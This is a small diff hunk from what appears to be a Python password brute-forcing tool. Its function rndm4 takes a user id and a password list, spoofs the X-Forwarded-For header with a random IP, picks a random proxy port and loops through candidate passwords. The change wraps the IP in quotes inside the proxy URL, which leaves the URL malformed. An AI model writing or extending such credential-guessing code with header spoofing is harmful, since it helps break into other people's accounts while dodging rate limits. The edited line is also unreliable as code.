@@ -1324,7 +1324,7 @@ def rndm4(uid,passlist):
         port=random.choice(['80','443','8080'])
         session=requests.Session()
         session.headers.update({'X-Forwarded-For': ipz})
-        proxy_url = f"http://{ipz}:{port}"
+        proxy_url = f"http://'{ipz}':{port}"
         au=Ugen()
         try:
                 for pas in passlist:
